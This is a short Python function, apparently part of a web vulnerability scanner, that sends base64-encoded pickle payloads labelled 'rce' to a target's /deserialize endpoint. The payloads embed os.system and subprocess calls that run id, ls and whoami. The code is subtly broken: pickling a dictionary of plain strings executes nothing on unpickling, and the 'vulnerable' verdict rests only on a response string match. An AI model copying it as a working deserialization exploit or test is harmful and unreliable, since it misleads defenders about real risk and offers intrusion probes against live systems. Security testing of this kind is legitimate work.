import requests
import base64
import pickle

def test_insecure_deserialization(url):
    payloads = [
        base64.b64encode(pickle.dumps({"rce": "__import__('os').system('id')"})).decode(),
        base64.b64encode(pickle.dumps({"rce": "__import__('os').system('ls')"})).decode(),
        base64.b64encode(pickle.dumps({"rce": "__import__('subprocess').getoutput('whoami')"})).decode(),
    ]

    results = []

    for payload in payloads:
        try:
            full_url = f"{url}/deserialize"
            response = requests.post(full_url, data=payload)
            if response.status_code == 200 and "Deserialized object" in response.text:
                results.append({"payload": payload, "vulnerable": True})
            else:
                results.append({"payload": payload, "vulnerable": False})
        except Exception as e:
            return {"error": f"Error testing Insecure Deserialization: {str(e)}"}

    return {"results": results}
